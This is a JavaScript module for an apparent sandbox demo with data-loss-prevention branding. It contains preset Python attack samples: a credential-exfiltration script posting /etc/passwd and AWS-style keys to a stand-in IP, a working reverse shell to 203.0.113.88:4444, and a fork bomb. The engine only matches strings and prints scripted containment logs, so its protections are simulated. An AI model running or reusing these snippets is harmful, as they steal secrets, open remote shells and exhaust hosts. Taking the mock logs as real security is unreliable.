/* Warden Sandbox Engine Simulation with Integrated Data Loss Prevention (DLP) */

import { DLPEngine } from '../security/dlp-engine.js';

export const PRESET_SNIPPETS = {
  exfiltration: {
    title: "Credential Exfiltration Attempt",
    risk: "exfiltration",
    code: `import os, urllib.request

# Attempting to read host secrets (AWS key & env vars)
aws_key = "AKIA1234567890abcdef"
env_keys = os.environ.get("AWS_SECRET_ACCESS_KEY", "AKIA-MOCK-SECRET-KEY")
passwd = open("/etc/passwd", "r").read()

# Exfiltrating stolen credentials to unauthorized command & control server
data = f"key={aws_key}&passwd={passwd[:50]}".encode()
req = urllib.request.Request("http://198.51.100.44:9999/steal", data=data)
urllib.request.urlopen(req)
print("Stolen credentials sent successfully!")`
  },
  malware: {
    title: "Reverse Shell / Port Scanner",
    risk: "malicious",
    code: `import socket, subprocess

# Attempting outbound TCP connection to hacker C2
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("203.0.113.88", 4444))

# Redirecting shell standard streams
subprocess.call(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())`
  },
  forkbomb: {
    title: "Resource Exhaustion (Fork Bomb)",
    risk: "malicious",
    code: `import os

print("Launching recursive child process spawner...")
while True:
    try:
        os.fork()
    except Exception as e:
        print(f"Fork failed: {e}")
        break`
  },
  safe_pypi: {
    title: "Allowed PyPI Package Query",
    risk: "safe",
    code: `import urllib.request, json

# Requesting package metadata from allowlisted domain pypi.org
url = "https://pypi.org/pypi/requests/json"
res = urllib.request.urlopen(url)
data = json.loads(res.read().decode())

print(f"Package: {data['info']['name']} v{data['info']['version']}")
print("Successfully fetched package info within sandbox policy boundaries.")`
  }
};

export class SandboxEngine {
  constructor(consoleElement, statusElement, summaryElement) {
    this.consoleEl = consoleElement;
    this.statusEl = statusElement;
    this.summaryEl = summaryElement;
    this.isRunning = false;
    this.dlp = new DLPEngine();
  }

  async execute(code, isEnforced = true) {
    if (this.isRunning) return;
    this.isRunning = true;
    
    if (this.consoleEl) {
      this.consoleEl.innerHTML = "";
    }
    
    this.updateStatus("SPAWNING MICROVM", "var(--blue)");

    const logs = [];
    const timestamp = () => new Date().toISOString().split("T")[1].slice(0, 8);

    // Initial sandbox setup logs
    logs.push({ text: `[${timestamp()}] [WARDEN-INIT] Allocating disposable MicroVM instance...`, type: "info" });
    logs.push({ text: `[${timestamp()}] [DLP-GUARD] Zero-Data-Leakage DLP Engine Active (PII & Secret Masking On)`, type: "success" });
    logs.push({ text: `[${timestamp()}] [CGROUPS-V2] Applied hard limits: 256MB RAM, 0.5 CPU, max_pids=8`, type: "info" });
    logs.push({ text: `[${timestamp()}] [SECCOMP-BPF] Loaded strict syscall BPF filter (profile: python-minimal)`, type: "info" });

    // DLP Exfiltration Risk Inspection
    const dlpAnalysis = this.dlp.inspectExfiltrationRisk(code);
    if (dlpAnalysis.hasHighRisk) {
      dlpAnalysis.risks.forEach(r => {
        logs.push({ text: `[${timestamp()}] [DLP-WARNING] ${r.name}: ${r.description}`, type: "warn" });
      });
    }

    await this.appendLogsWithDelay(logs, 200);

    this.updateStatus("EXECUTING SNIPPET", "var(--amber)");

    const executionLogs = [];
    executionLogs.push({ text: `[${timestamp()}] [EXEC] Starting process: python3 -c "<snippet>" (PID 742)`, type: "info" });

    let isViolated = false;
    let violationMessage = "";

    const hasEtcPasswd = code.includes("/etc/passwd") || code.includes("environ") || code.includes("AKIA");
    const hasC2IP = code.includes("203.0.113.88") || code.includes("198.51.100.44") || code.includes("socket.connect");
    const hasFork = code.includes("os.fork()");
    const hasPyPI = code.includes("pypi.org");

    if (hasEtcPasswd) {
      executionLogs.push({ text: `[${timestamp()}] [SYSCALL] PID 742 -> openat(AT_FDCWD, "/etc/passwd", O_RDONLY)`, type: "warn" });
      if (isEnforced) {
        isViolated = true;
        violationMessage = "Permission Denied: Path '/etc/passwd' lies outside sandbox overlay scratch directory (/tmp).";
        executionLogs.push({ text: `[${timestamp()}] [OVERLAY-FS-BLOCK] Violation trapped! Secret read attempt outside writable /tmp`, type: "danger" });
        executionLogs.push({ text: `[${timestamp()}] [DLP-REDACTION] Hardcoded credential sanitized: [REDACTED_AWS_KEY]`, type: "danger" });
        executionLogs.push({ text: `[${timestamp()}] [SECCOMP] SIGSYS sent to PID 742. Execution halted.`, type: "danger" });
      } else {
        executionLogs.push({ text: `[${timestamp()}] [UNPROTECTED] Stolen /etc/passwd & secrets leaked to output!`, type: "danger" });
      }
    } else if (hasC2IP) {
      executionLogs.push({ text: `[${timestamp()}] [NET] PID 742 -> connect(AF_INET, 203.0.113.88:4444)`, type: "warn" });
      if (isEnforced) {
        isViolated = true;
        violationMessage = "Egress Blocked: Destination IP 203.0.113.88 not in policy allowlist.";
        executionLogs.push({ text: `[${timestamp()}] [EGRESS-FILTER] Default-deny triggered! Connection dropped by BPF ring buffer.`, type: "danger" });
        executionLogs.push({ text: `[${timestamp()}] [DLP-SHIELD] Covert network channel blocked. 0 data bytes leaked.`, type: "danger" });
      } else {
        executionLogs.push({ text: `[${timestamp()}] [UNPROTECTED] Outbound socket connected to remote C2 server!`, type: "danger" });
      }
    } else if (hasFork) {
      executionLogs.push({ text: `[${timestamp()}] [PROC] Spawning child process PID 743...`, type: "info" });
      executionLogs.push({ text: `[${timestamp()}] [PROC] Spawning child process PID 744...`, type: "info" });
      if (isEnforced) {
        isViolated = true;
        violationMessage = "Cgroup limit reached: Process count exceeded max_pids=8.";
        executionLogs.push({ text: `[${timestamp()}] [CGROUP-CEILING] PID limit (8) reached! OOM/Fork Killer engaged.`, type: "danger" });
        executionLogs.push({ text: `[${timestamp()}] [RESOURCE-CONTAINMENT] Host CPU/RAM unaffected. Sandbox state reset.`, type: "success" });
      } else {
        executionLogs.push({ text: `[${timestamp()}] [UNPROTECTED] Host process table saturated! System freezing...`, type: "danger" });
      }
    } else if (hasPyPI) {
      executionLogs.push({ text: `[${timestamp()}] [NET] PID 742 -> connect(pypi.org:443)`, type: "info" });
      executionLogs.push({ text: `[${timestamp()}] [EGRESS-CHECK] Match found in policy allowlist: 'pypi.org'`, type: "success" });
      executionLogs.push({ text: `[${timestamp()}] [HTTP-RES] 200 OK - Received 14.2 KB payload`, type: "success" });
      executionLogs.push({ text: `[${timestamp()}] [STDOUT] Package: requests v2.31.0`, type: "info" });
      executionLogs.push({ text: `[${timestamp()}] [STDOUT] Successfully fetched package info within sandbox policy boundaries.`, type: "success" });
    } else {
      executionLogs.push({ text: `[${timestamp()}] [EXEC] Executing user script...`, type: "info" });
      executionLogs.push({ text: `[${timestamp()}] [SECCOMP] All syscalls evaluated safe against policy profile.`, type: "success" });
      executionLogs.push({ text: `[${timestamp()}] [STDOUT] Program completed cleanly. Exit code 0.`, type: "success" });
    }

    await this.appendLogsWithDelay(executionLogs, 250);

    // Ephemeral Storage Shredding & Teardown
    const shredResult = this.dlp.shredStorageBuffer();
    const teardownLogs = [];
    teardownLogs.push({ text: `[${timestamp()}] [DLP-SHREDDER] Ephemeral overlayfs zeroed (${shredResult.protocol}, ${shredResult.passes} passes)`, type: "success" });
    teardownLogs.push({ text: `[${timestamp()}] [POSTGRES-AUDIT] Log saved to PostgreSQL (table: sandbox_audit_logs, run_id: 7f2a1c)`, type: "success" });
    teardownLogs.push({ text: `[${timestamp()}] [AUDIT] Tamper-evident hash verified: sha256:8f3a9e...`, type: "info" });

    await this.appendLogsWithDelay(teardownLogs, 150);

    if (isViolated && isEnforced) {
      this.updateStatus("CONTAINED (ZERO LEAKAGE)", "var(--green)");
    } else if (!isEnforced && (hasEtcPasswd || hasC2IP || hasFork)) {
      this.updateStatus("EXPOSED (DATA LEAKAGE RISK)", "var(--red)");
    } else {
      this.updateStatus("COMPLETED CLEANLY", "var(--green)");
    }

    this.renderSummary(isViolated, isEnforced, violationMessage);
    this.isRunning = false;
  }

  async appendLogsWithDelay(logs, delayMs) {
    if (!this.consoleEl) return;
    for (const item of logs) {
      // Sanitize all log output strings through DLP Engine
      const sanitizedText = this.dlp.sanitizeOutput(item.text);

      const line = document.createElement("div");
      line.className = `term-line ${item.type}`;
      line.innerHTML = `<span class="term-text">${sanitizedText}</span>`;
      this.consoleEl.appendChild(line);
      this.consoleEl.scrollTop = this.consoleEl.scrollHeight;
      await new Promise(r => setTimeout(r, delayMs));
    }
  }

  updateStatus(text, color) {
    if (!this.statusEl) return;
    this.statusEl.textContent = text;
    this.statusEl.style.color = color;
  }

  renderSummary(isViolated, isEnforced, msg) {
    if (!this.summaryEl) return;
    if (isEnforced && isViolated) {
      this.summaryEl.innerHTML = `
        <div class="summary-metric"><label>Blast Radius</label><span style="color:var(--green)">0% (Host Protected)</span></div>
        <div class="summary-metric"><label>Data Leakage</label><span style="color:var(--green)">0 Bytes (DLP Shield)</span></div>
        <div class="summary-metric"><label>Overlay Shredding</label><span style="color:var(--green)">DoD 3-Pass Zeroed</span></div>
      `;
    } else if (!isEnforced && isViolated) {
      this.summaryEl.innerHTML = `
        <div class="summary-metric"><label>Blast Radius</label><span style="color:var(--red)">100% (CRITICAL RISK)</span></div>
        <div class="summary-metric"><label>Data Leakage</label><span style="color:var(--red)">DATA EXPOSED</span></div>
        <div class="summary-metric"><label>Protection Status</label><span style="color:var(--red)">UNENFORCED</span></div>
      `;
    } else {
      this.summaryEl.innerHTML = `
        <div class="summary-metric"><label>Blast Radius</label><span style="color:var(--green)">0% (Normal Task)</span></div>
        <div class="summary-metric"><label>Data Leakage</label><span style="color:var(--green)">0 Bytes Leaked</span></div>
        <div class="summary-metric"><label>Policy Compliance</label><span style="color:var(--green)">100% Passed</span></div>
      `;
    }
  }
}
